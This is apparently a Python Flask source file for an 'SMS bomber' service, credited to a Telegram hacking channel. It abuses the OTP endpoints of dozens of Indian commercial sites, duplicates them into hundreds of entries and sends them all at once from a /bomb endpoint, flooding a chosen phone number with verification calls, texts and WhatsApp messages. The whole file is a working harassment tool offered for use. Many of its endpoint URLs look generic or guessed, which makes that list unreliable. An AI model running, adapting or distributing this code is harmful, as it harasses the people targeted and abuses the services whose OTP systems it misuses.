from flask import Flask, request, jsonify
import requests
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

app = Flask(__name__)

# ========== OWNER / DEVELOPER INFO ==========
OWNER = "@notxsatvir"
DEVELOPER = "@notxsatvir"
CHANNEL = "https://t.me/freehackingg"
API_VERSION = "6.0.0"

# ========== 500+ APIs GENERATOR ==========
def generate_apis():
    apis = []

    # Call API Templates
    call_templates = [
        ("Tata Capital Voice", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", {"phone": "{phone}"}),
        ("1MG Voice", "https://www.1mg.com/auth_api/v6/create_token", {"number": "{phone}", "otp_on_call": True}),
        ("Swiggy Voice", "https://profile.swiggy.com/api/v3/app/request_call_verification", {"mobile": "{phone}"}),
        ("Flipkart Voice", "https://www.flipkart.com/api/6/user/voice-otp/generate", {"mobile": "{phone}"}),
        ("Zivame Voice", "https://api.zivame.com/v2/customer/login/send-otp", {"phone_number": "{phone}", "otp_type": "voice"}),
        ("Myntra Voice", "https://www.myntra.com/api/v1/user/voice-otp", {"mobile": "{phone}"}),
        ("Paytm Voice", "https://paytm.com/api/v1/auth/voice-otp", {"mobile": "{phone}"}),
        ("Uber Voice", "https://auth.uber.com/api/v1/voice-otp", {"phone": "{phone}"}),
        ("Amazon Voice", "https://www.amazon.in/ap/voice-otp", {"phoneNumber": "{phone}"}),
        ("Ola Voice", "https://auth.olacabs.com/api/v1/voice-otp", {"mobile": "{phone}"}),
    ]

    # SMS API Templates
    sms_templates = [
        ("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", {"phoneCode": "+91", "telephone": "{phone}"}),
        ("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", {"phone": "{phone}"}),
        ("Snitch", "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", {"mobile_number": "+91{phone}"}),
        ("ShipRocket", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", {"mobileNumber": "{phone}"}),
        ("GoKwik", "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", {"phone": "{phone}", "country": "in"}),
        ("NewMe", "https://prodapi.newme.asia/web/otp/request", {"mobile_number": "{phone}", "resend_otp_request": True}),
        ("Wakefit", "https://api.wakefit.co/api/consumer-sms-otp/", {"mobile": "{phone}"}),
        ("Hungama", "https://communication.api.hungama.com/v1/communication/otp", {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}),
        ("Doubtnut", "https://api.doubtnut.com/v4/student/login", {"phone_number": "{phone}", "language": "en"}),
        ("PenPencil", "https://api.penpencil.co/v1/users/resend-otp?smsType=1", {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"}),
        ("BeepKart", "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", {"phone": "{phone}", "city": 362}),
        ("Smytten", "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", {"phone": "{phone}", "email": "test@example.com"}),
        ("MyHubble", "https://api.myhubble.money/v1/auth/otp/generate", {"phoneNumber": "{phone}", "channel": "SMS"}),
        ("Housing", "https://login.housing.com/api/v2/send-otp", {"phone": "{phone}", "country_url_name": "in"}),
        ("RentoMojo", "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", {"phone": "{phone}"}),
        ("Khatabook", "https://api.khatabook.com/v1/auth/request-otp", {"phone": "{phone}", "app_signature": "wk+avHrHZf2"}),
        ("Animall", "https://animall.in/zap/auth/login", {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"}),
        ("Cosmofeed", "https://prod.api.cosmofeed.com/api/user/authenticate", {"phone": "{phone}", "version": "1.4.28"}),
        ("Spencer", "https://jiffy.spencers.in/user/auth/otp/send", {"mobile": "{phone}"}),
        ("ShoppersStop", "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", {"mobile": "{phone}", "type": "SIGNIN_WITH_MOBILE"}),
        ("Lifestyle", "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", {"signInMobile": "{phone}", "channel": "sms"}),
        ("PokerBaazi", "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", {"mobile": "{phone}", "mfa_channels": "phno"}),
        ("My11Circle", "https://www.my11circle.com/api/fl/auth/v3/getOtp", {"mobile": "{phone}", "mfa_channels": "phno"}),
        ("RummyCircle", "https://www.rummycircle.com/api/fl/auth/v3/getOtp", {"mobile": "{phone}", "isPlaycircle": False}),
        ("Cred", "https://api.cred.club/v1/auth/otp", {"phone": "{phone}"}),
        ("Grofers", "https://grofers.com/api/v2/auth/send-otp", {"mobile": "{phone}"}),
        ("BigBasket", "https://www.bigbasket.com/api/auth/send-otp", {"mobile_number": "{phone}"}),
        ("Zepto", "https://zepto.co/api/v1/auth/otp", {"phone": "{phone}"}),
        ("Blinkit", "https://blinkit.com/api/v2/auth/otp", {"mobile": "{phone}"}),
        ("Dunzo", "https://dunzo.com/api/v1/auth/send-otp", {"phone": "{phone}"}),
        ("MakeMyTrip", "https://www.makemytrip.com/api/auth/otp", {"mobile": "{phone}"}),
        ("Goibibo", "https://www.goibibo.com/api/auth/send-otp", {"mobile": "{phone}"}),
        ("Cleartrip", "https://www.cleartrip.com/api/auth/otp", {"phone": "{phone}"}),
        ("Yatra", "https://www.yatra.com/api/auth/otp", {"mobile": "{phone}"}),
        ("RedBus", "https://www.redbus.in/api/auth/otp", {"mobile": "{phone}"}),
        ("UberSMS", "https://auth.uber.com/api/v1/otp", {"phone": "{phone}"}),
        ("OlaSMS", "https://auth.olacabs.com/api/v1/otp", {"mobile": "{phone}"}),
        ("Rapido", "https://rapido.in/api/v1/auth/otp", {"phone": "{phone}"}),
        ("AmazonSMS", "https://www.amazon.in/ap/otp", {"phoneNumber": "{phone}"}),
        ("Meesho", "https://www.meesho.com/api/v1/auth/otp", {"mobile": "{phone}"}),
        ("ShopClues", "https://www.shopclues.com/api/auth/otp", {"mobile": "{phone}"}),
        ("Ajio", "https://www.ajio.com/api/v1/auth/otp", {"mobile": "{phone}"}),
        ("Nykaa", "https://www.nykaa.com/api/v1/auth/otp", {"phone": "{phone}"}),
        ("Purplle", "https://www.purplle.com/api/v1/auth/otp", {"mobile": "{phone}"}),
    ]

    # WhatsApp Templates
    whatsapp_templates = [
        ("KPN WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{phone}"}}),
        ("Rappi WhatsApp", "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", {"country_code": "+91", "phone": "{phone}"}),
        ("Eka Care WhatsApp", "https://auth.eka.care/auth/init", {"payload": {"allowWhatsapp": True, "mobile": "+91{phone}"}, "type": "mobile"}),
    ]

    # Generate Call APIs (250)
    for i in range(25):
        for name, url, data in call_templates:
            final_name = f"{name}_v{i}" if i > 0 else name
            apis.append({
                "name": final_name,
                "type": "Call",
                "url": url,
                "method": "POST",
                "headers": {"Content-Type": "application/json"},
                "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
            })

    # Generate SMS APIs (250)
    for i in range(5):
        for name, url, data in sms_templates:
            final_name = f"{name}_SMS{i}" if i > 0 else name
            apis.append({
                "name": final_name,
                "type": "SMS",
                "url": url,
                "method": "POST",
                "headers": {"Content-Type": "application/json"},
                "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
            })

    # Generate WhatsApp APIs (50+)
    for i in range(20):
        for name, url, data in whatsapp_templates:
            final_name = f"{name}_v{i}" if i > 0 else name
            apis.append({
                "name": final_name,
                "type": "WhatsApp",
                "url": url,
                "method": "POST",
                "headers": {"Content-Type": "application/json"},
                "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
            })

    return apis

APIS = generate_apis()
TOTAL_APIS = len(APIS)
print(f"✅ Loaded {TOTAL_APIS} APIs")

def hit_api(api, phone):
    try:
        data_str = api["data"](phone)
        data_dict = json.loads(data_str)
        resp = requests.post(api["url"], headers=api["headers"], json=data_dict, timeout=4)
        if resp.status_code in [200, 201, 202, 204]:
            return api["type"], True
    except Exception:
        pass
    return api["type"], False

@app.route('/')
def home():
    return jsonify({
        "success": True,
        "api": "Bombing API (500+ APIs)",
        "owner": OWNER,
        "developer": DEVELOPER,
        "channel": CHANNEL,
        "version": API_VERSION,
        "total_apis": TOTAL_APIS,
        "endpoint": "/bomb?number=9876543210"
    })

@app.route('/bomb')
def bomb():
    number = request.args.get('number')
    if not number or not re.match(r'^[6-9]\d{9}$', number):
        return jsonify({"error": "Valid 10-digit number required"}), 400

    stats = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(hit_api, api, number) for api in APIS]
        for future in as_completed(futures):
            typ, success = future.result()
            if success:
                stats[typ] += 1

    return jsonify({
        "success": True,
        "owner": OWNER,
        "developer": DEVELOPER,
        "channel": CHANNEL,
        "number": number,
        "total_apis_attempted": TOTAL_APIS,
        "successful_hits": sum(stats.values()),
        "stats": stats,
        "timestamp": datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
